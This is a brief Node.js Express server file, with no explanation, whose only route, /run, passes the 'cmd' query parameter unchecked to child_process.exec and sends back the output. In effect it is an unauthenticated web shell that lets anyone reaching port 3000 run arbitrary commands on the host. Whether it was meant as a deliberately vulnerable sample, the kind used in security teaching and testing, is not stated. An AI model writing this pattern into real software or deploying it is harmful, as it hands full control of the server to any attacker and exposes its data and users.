const { exec } = require("child_process");
const express = require("express");
const app = express();

app.get("/run", (req, res) => {
  exec(req.query.cmd, (err, stdout) => {
    if (err) {
      return res.status(500).send(err.message);
    }
    res.send(stdout);
  });
});

app.listen(3000);
